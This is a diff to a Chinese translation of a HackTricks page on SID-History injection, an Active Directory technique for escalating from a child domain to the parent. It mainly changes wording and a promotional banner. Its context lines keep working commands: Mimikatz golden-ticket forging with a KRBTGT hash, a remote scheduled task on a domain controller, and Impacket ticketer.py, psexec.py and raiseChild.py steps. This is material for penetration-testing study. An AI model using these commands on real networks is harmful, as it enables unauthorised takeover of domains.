@@ -1,14 +1,28 @@
-# SID历史记录注入攻击
+# SID-History Injection
 
-**SID历史记录注入攻击**的重点是在帮助**用户在域之间迁移**的同时，确保他们可以继续访问来自以前域的资源。这是通过将用户以前的安全标识符（SID）**合并到其新帐户的SID历史记录**中来实现的。值得注意的是，通过将父域的高特权组（如企业管理员或域管理员）的SID添加到SID历史记录中，可以操纵此过程以授予未经授权的访问权限。这种利用赋予对父域内所有资源的访问权限。
+<details>
 
-有两种方法可用于执行此攻击：通过创建**黄金票证**或**钻石票证**。
+<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>
 
-要找到**“企业管理员”**组的SID，首先必须找到根域的SID。在确定后，可以通过将`-519`附加到根域的SID来构建企业管理员组的SID。例如，如果根域SID为`S-1-5-21-280534878-1496970234-700767426`，则“企业管理员”组的结果SID将是`S-1-5-21-280534878-1496970234-700767426-519`。
+* 您在**网络安全公司**工作吗？ 想要看到您的**公司在HackTricks中做广告**？ 或者想要访问**PEASS的最新版本或下载PDF格式的HackTricks**？ 请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
+* 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
+* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
+* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
+* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享您的黑客技巧**。
 
-您还可以使用**域管理员**组，其以**512**结尾。
+</details>
 
-另一种找到其他域组（例如“域管理员”）的SID的方法是：
+## SID History Injection 攻击
+
+**SID History Injection 攻击**的重点是在**用户在域之间迁移**时，确保他们可以继续访问来自以前域的资源。这是通过将用户以前的安全标识符（SID）合并到其新帐户的SID History中来实现的。值得注意的是，通过将父域中高特权组（例如企业管理员或域管理员）的SID添加到SID History中，可以操纵此过程以授予未经授权的访问权限。这种利用赋予对父域内所有资源的访问权限。
+
+有两种方法可用于执行此攻击：通过创建**Golden Ticket**或**Diamond Ticket**。
+
+要找到**"Enterprise Admins"**组的SID，首先必须找到根域的SID。在确定后，可以通过在根域的SID后附加`-519`来构建Enterprise Admins组的SID。例如，如果根域SID为`S-1-5-21-280534878-1496970234-700767426`，则"Enterprise Admins"组的结果SID将是`S-1-5-21-280534878-1496970234-700767426-519`。
+
+您还可以使用**Domain Admins**组，其以**512**结尾。
+
+另一种找到其他域组的SID（例如"Domain Admins"）的方法是：
 ```powershell
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
 ```
@@ -67,9 +81,7 @@ ls \\mcorp-dc.moneycorp.local\c$
 ```
 {% endcode %}
 
-使用受损域的KRBTGT哈希值升级为DA或根管理员或企业管理员： 
-
-{% code overflow="wrap" %}
+使用受损域的KRBTGT哈希值升级为DA或根管理员或企业管理员：
 ```bash
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
 
@@ -83,15 +95,17 @@ schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
 ```
 {% endcode %}
 
-通过攻击获得的权限，您可以在新域中执行例如 DCSync 攻击：
+通过攻击获得的权限，您可以在新域中执行例如DCSync攻击：
 
 {% content-ref url="dcsync.md" %}
 [dcsync.md](dcsync.md)
 {% endcontent-ref %}
 
-### 从 Linux
+### 从Linux
 
-#### 使用 [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) 手动操作
+#### 使用[ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)手动操作
+
+{% code overflow="wrap" %}
 ```bash
 # This is for an attack from child to root domain
 # Get child domain SID
@@ -115,7 +129,7 @@ psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.1
 
 #### 使用 [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py) 进行自动化
 
-这是一个 Impacket 脚本，可以**自动从子域升级到父域**。脚本需要：
+这是一个 Impacket 脚本，可以**自动将权限从子域升级到父域**。脚本需要：
 
 * 目标域控制器
 * 子域中管理员用户的凭证
@@ -137,12 +151,12 @@ raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>从零开始学习AWS黑客技术</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>
 
-* 您在**网络安全公司**工作吗？想要在HackTricks中看到您的**公司广告**？或者想要访问**PEASS的最新版本或下载HackTricks的PDF**？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
+* 您在**网络安全公司**工作吗？ 想要看到您的**公司在HackTricks中做广告**？ 或者想要访问**PEASS的最新版本或下载HackTricks的PDF**？ 请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
 * 发现我们的独家[NFTs收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
 * 获取[**官方PEASS & HackTricks周边**](https://peass.creator-spring.com)
-* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 * **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享您的黑客技巧**。
 
 </details>
